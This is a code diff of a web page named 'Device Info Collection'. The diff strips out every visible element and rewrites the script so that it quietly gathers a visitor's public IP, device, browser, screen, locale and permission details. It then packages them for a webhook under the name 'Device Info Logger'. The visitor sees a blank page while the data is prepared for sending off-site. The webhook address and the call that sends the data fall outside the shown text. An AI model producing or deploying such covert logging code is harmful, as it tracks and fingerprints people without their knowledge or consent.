@@ -3,87 +3,8 @@
 <head>
 <meta charset="UTF-8">
 <title>Device Info Collection</title>
-<style>
-    body {
-        font-family: Arial, sans-serif;
-        background: #f2f2f2;
-        padding: 20px;
-    }
-    .box {
-        background: white;
-        max-width: 900px;
-        margin: auto;
-        padding: 20px;
-        border-radius: 10px;
-        box-shadow: 0 0 10px rgba(0,0,0,0.1);
-    }
-    h2 {
-        text-align: center;
-    }
-    h3 {
-        margin-top: 25px;
-        border-bottom: 1px solid #ddd;
-        padding-bottom: 5px;
-    }
-    p {
-        margin: 4px 0;
-    }
-</style>
 </head>
 <body>
-
-<div class="box">
-<h2>Device Information Collection</h2>
-
-<h3>🔋 Battery</h3>
-<p>Battery Level: <span id="battery">Loading...</span></p>
-<p>Charging: <span id="charging">Loading...</span></p>
-<p>Charging Time: <span id="chargeTime">N/A</span></p>
-<p>Discharging Time: <span id="dischargeTime">N/A</span></p>
-
-<h3>🌐 Network</h3>
-<p>Public IP: <span id="ip">Loading...</span></p>
-<p>Connection Type: <span id="connection">Unknown</span></p>
-<p>Effective Type: <span id="effective">Unknown</span></p>
-<p>Downlink Speed: <span id="downlink">Unknown</span></p>
-<p>Online Status: <span id="online"></span></p>
-
-<h3>🖥️ Device & Display</h3>
-<p>Device Type: <span id="device"></span></p>
-<p>Device Model: <span id="model">Unknown</span></p>
-<p>Device Name: <span id="deviceName">Unknown</span></p>
-<p>CPU Cores: <span id="cores"></span></p>
-<p>Device Memory: <span id="memory"></span></p>
-<p>Screen Resolution: <span id="screenRes"></span></p>
-<p>Available Screen: <span id="availScreen"></span></p>
-<p>Color Depth: <span id="colorDepth"></span></p>
-<p>Pixel Ratio: <span id="pixelRatio"></span></p>
-<p>Touch Support: <span id="touch"></span></p>
-<p>Max Touch Points: <span id="touchPoints"></span></p>
-
-<h3>🧠 Browser & OS</h3>
-<p>Operating System: <span id="os"></span></p>
-<p>Browser: <span id="browser"></span></p>
-<p>Browser Version: <span id="browserVersion"></span></p>
-<p>User Agent: <span id="ua"></span></p>
-<p>Platform: <span id="platform"></span></p>
-<p>Vendor: <span id="vendor"></span></p>
-<p>Cookies Enabled: <span id="cookies"></span></p>
-<p>Do Not Track: <span id="dnt"></span></p>
-
-<h3>🌍 Locale & Time</h3>
-<p>Language: <span id="language"></span></p>
-<p>Languages: <span id="languages"></span></p>
-<p>Timezone: <span id="timezone"></span></p>
-<p>Local Time: <span id="localTime"></span></p>
-<p>UTC Offset: <span id="offset"></span></p>
-
-<h3>🔐 Permissions (Status Only)</h3>
-<p>Geolocation: <span id="geoPerm"></span></p>
-<p>Camera: <span id="camPerm"></span></p>
-<p>Microphone: <span id="micPerm"></span></p>
-
-</div>
 
 <script>
 /* ---------------- UTILITY FUNCTIONS ---------------- */
@@ -128,109 +49,106 @@ function getDeviceModel() {
     return "Unknown";
 }
 
-/* ---------------- BATTERY ---------------- */
+/* ---------------- DATA COLLECTION ---------------- */
+const data = {};
+
+// Battery
 if (navigator.getBattery) {
     navigator.getBattery().then(b => {
-        battery.innerText = Math.round(b.level * 100) + "%";
-        charging.innerText = b.charging ? "Yes" : "No";
-        chargeTime.innerText =
-            b.chargingTime === Infinity ? "Unknown" : b.chargingTime + " sec";
-        dischargeTime.innerText =
-            b.dischargingTime === Infinity ? "Unknown" : b.dischargingTime + " sec";
+        data.battery = Math.round(b.level * 100) + "%";
+        data.charging = b.charging ? "Yes" : "No";
+        data.chargeTime = b.chargingTime === Infinity ? "Unknown" : b.chargingTime + " sec";
+        data.dischargeTime = b.dischargingTime === Infinity ? "Unknown" : b.dischargingTime + " sec";
     });
 } else {
-    battery.innerText = charging.innerText = "Not supported";
+    data.battery = data.charging = "Not supported";
 }
 
-/* ---------------- IP ---------------- */
+// IP
 fetch("https://api.ipify.org?format=json")
 .then(r => r.json())
-.then(d => ip.innerText = d.ip)
-.catch(() => ip.innerText = "Unavailable");
+.then(d => data.ip = d.ip)
+.catch(() => data.ip = "Unavailable");
 
-/* ---------------- NETWORK ---------------- */
+// Network
 const conn = navigator.connection || {};
-connection.innerText = conn.type || "Unknown";
-effective.innerText = conn.effectiveType || "Unknown";
-downlink.innerText = conn.downlink ? conn.downlink + " Mbps" : "Unknown";
-online.innerText = navigator.onLine ? "Online" : "Offline";
+data.connection = conn.type || "Unknown";
+data.effective = conn.effectiveType || "Unknown";
+data.downlink = conn.downlink ? conn.downlink + " Mbps" : "Unknown";
+data.online = navigator.onLine ? "Online" : "Offline";
 
-/* ---------------- DEVICE ---------------- */
+// Device
 const uaStr = navigator.userAgent;
-device.innerText = /Mobi|Android|iPhone|iPad/i.test(uaStr) ? "Mobile / Tablet" : "Desktop";
-model.innerText = getDeviceModel();
-deviceName.innerText = "N/A"; // Not accessible via JS
-cores.innerText = navigator.hardwareConcurrency || "Unknown";
-memory.innerText = navigator.deviceMemory
-    ? navigator.deviceMemory + " GB (approx)"
-    : "Unknown";
+data.device = /Mobi|Android|iPhone|iPad/i.test(uaStr) ? "Mobile / Tablet" : "Desktop";
+data.model = getDeviceModel();
+data.deviceName = "N/A";
+data.cores = navigator.hardwareConcurrency || "Unknown";
+data.memory = navigator.deviceMemory ? navigator.deviceMemory + " GB (approx)" : "Unknown";
+data.screenRes = screen.width + " x " + screen.height;
+data.availScreen = screen.availWidth + " x " + screen.availHeight;
+data.colorDepth = screen.colorDepth;
+data.pixelRatio = window.devicePixelRatio;
+data.touch = ('ontouchstart' in window) ? "Yes" : "No";
+data.touchPoints = navigator.maxTouchPoints || 0;
 
-screenRes.innerText = screen.width + " x " + screen.height;
-availScreen.innerText = screen.availWidth + " x " + screen.availHeight;
-colorDepth.innerText = screen.colorDepth;
-pixelRatio.innerText = window.devicePixelRatio;
-touch.innerText = ('ontouchstart' in window) ? "Yes" : "No";
-touchPoints.innerText = navigator.maxTouchPoints || 0;
+// Browser & OS
+data.os = getOS();
+data.browser = getBrowser();
+data.browserVersion = getBrowserVersion();
+data.ua = uaStr;
+data.platform = navigator.platform;
+data.vendor = navigator.vendor || "Unknown";
+data.cookies = navigator.cookieEnabled ? "Enabled" : "Disabled";
+data.dnt = navigator.doNotTrack || "Not specified";
 
-/* ---------------- BROWSER & OS ---------------- */
-os.innerText = getOS();
-browser.innerText = getBrowser();
-browserVersion.innerText = getBrowserVersion();
-ua.innerText = uaStr;
-platform.innerText = navigator.platform;
-vendor.innerText = navigator.vendor || "Unknown";
-cookies.innerText = navigator.cookieEnabled ? "Enabled" : "Disabled";
-dnt.innerText = navigator.doNotTrack || "Not specified";
+// Locale
+data.language = navigator.language;
+data.languages = navigator.languages.join(", ");
+data.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+data.localTime = new Date().toString();
+data.offset = new Date().getTimezoneOffset() + " minutes";
 
-/* ---------------- LOCALE ---------------- */
-language.innerText = navigator.language;
-languages.innerText = navigator.languages.join(", ");
-timezone.innerText = Intl.DateTimeFormat().resolvedOptions().timeZone;
-localTime.innerText = new Date().toString();
-offset.innerText = new Date().getTimezoneOffset() + " minutes";
-
-/* ---------------- PERMISSIONS ---------------- */
+// Permissions
 if (navigator.permissions) {
     navigator.permissions.query({name: "geolocation"})
-        .then(p => geoPerm.innerText = p.state);
+        .then(p => data.geoPerm = p.state);
     navigator.permissions.query({name: "camera"})
-        .then(p => camPerm.innerText = p.state);
+        .then(p => data.camPerm = p.state);
     navigator.permissions.query({name: "microphone"})
-        .then(p => micPerm.innerText = p.state);
+        .then(p => data.micPerm = p.state);
 }
 
-/* ---------------- SEND TO DISCORD ---------------- */
+/* ---------------- SEND TO WEBHOOK ---------------- */
 function sendToWebhook() {
-
     const payload = {
         username: "Device Info Logger",
         embeds: [{
             title: "New Device Submission",
             color: 5793266,
             fields: [
-                { name: "Battery", value: battery.innerText, inline: true },
-                { name: "Charging", value: charging.innerText, inline: true },
-                { name: "Public IP", value: ip.innerText, inline: false },
+                { name: "Battery", value: data.battery || "Loading...", inline: true },
+                { name: "Charging", value: data.charging || "Loading...", inline: true },
+                { name: "Public IP", value: data.ip || "Loading...", inline: false },
 
-                { name: "Device Type", value: device.innerText, inline: true },
-                { name: "Device Model", value: model.innerText, inline: true },
-                { name: "Device Name", value: deviceName.innerText, inline: true },
-                { name: "CPU Cores", value: cores.innerText, inline: true },
-                { name: "Memory", value: memory.innerText, inline: true },
+                { name: "Device Type", value: data.device, inline: true },
+                { name: "Device Model", value: data.model, inline: true },
+                { name: "Device Name", value: data.deviceName, inline: true },
+                { name: "CPU Cores", value: data.cores, inline: true },
+                { name: "Memory", value: data.memory, inline: true },
 
-                { name: "Screen", value: screenRes.innerText, inline: true },
-                { name: "Pixel Ratio", value: pixelRatio.innerText, inline: true },
+                { name: "Screen", value: data.screenRes, inline: true },
+                { name: "Pixel Ratio", value: data.pixelRatio, inline: true },
 
-                { name: "OS", value: os.innerText, inline: true },
-                { name: "Browser", value: browser.innerText, inline: true },
-                { name: "Browser Version", value: browserVersion.innerText, inline: true },
-                { name: "Platform", value: platform.innerText, inline: true },
-                { name: "Language", value: language.innerText, inline: true },
-                { name: "Timezone", value: timezone.innerText, inline: true },
+                { name: "OS", value: data.os, inline: true },
+                { name: "Browser", value: data.browser, inline: true },
+                { name: "Browser Version", value: data.browserVersion, inline: true },
+                { name: "Platform", value: data.platform, inline: true },
+                { name: "Language", value: data.language, inline: true },
+                { name: "Timezone", value: data.timezone, inline: true },
 
                 {
                     name: "User Agent",
-                    value: ua.innerText.slice(0, 1000),
+                    value: data.ua.slice(0, 1000),
                     inline: false
                 }
             ],
